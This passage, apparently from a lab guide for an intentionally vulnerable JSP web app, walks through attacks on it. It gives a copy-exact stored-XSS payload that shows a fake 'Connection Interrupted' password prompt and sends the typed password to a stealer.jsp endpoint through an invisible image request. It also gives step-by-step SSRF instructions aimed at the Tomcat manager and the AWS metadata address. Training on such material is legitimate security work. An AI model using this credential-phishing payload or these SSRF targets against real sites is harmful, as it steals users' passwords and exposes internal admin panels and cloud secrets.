...
5. For the **Content**, choose one of these Real-World Payloads (copy exactly as shown, without any extra quotes):
   ...
   **Payload 2: The "Silent Data Stealer" (Phishing & Exfiltration)**
   Pops up a fake login prompt. When the user types their password, it silently sends it to the hacker's server (`stealer.jsp`) using an invisible image request.
   ```html
   <script>let p=prompt("Connection Interrupted. Please re-enter your password to reconnect:"); if(p) { let img = new Image(); img.src = "stealer.jsp?data=" + encodeURIComponent(p); alert("Reconnected Successfully."); }</script>
   ```
...
### Attack 13: Server-Side Request Forgery (SSRF) (A10:2021)

**The Vulnerability:** 
On the Admin Announcements page (`admin_announcements.jsp`), there is an "Attach Link Preview" feature. It takes a URL provided by the Admin and forces the Java backend to fetch that URL's content using `HttpURLConnection`.

**The Goal:**
Force the backend server to read its own highly sensitive internal configuration files and post them to the public notice board.

**The Steps:**
1. Log in as an Admin and navigate to the **Manage Announcements** page.
2. In the Title field, type: `Server Config Leak`
3. In the Content field, type: `Here is our internal config:`
4. In the **Attach Link Preview** field, type exactly this URL: 
   `http://localhost:8080/manager/html` or `http://localhost:8080/manager/status`
   *(Or if hosting on AWS, use the metadata endpoint: `http://169.254.169.254/latest/meta-data/`)*
5. Click **Post Announcement**.
6. **The Result:** Look at the resulting announcement. Below your text, the server has printed out the raw HTML source code of the Tomcat Manager dashboard, which is usually firewalled off from public internet users.

**Why it works:**
The server blindly trusts the URL provided by the user. An external attacker cannot access `localhost:8080/manager` from the outside internet because of firewalls. However, by exploiting SSRF, the attacker forces the server *itself* to make the request from the inside, bypassing the firewall to read internal documents, admin panels, or cloud secrets.
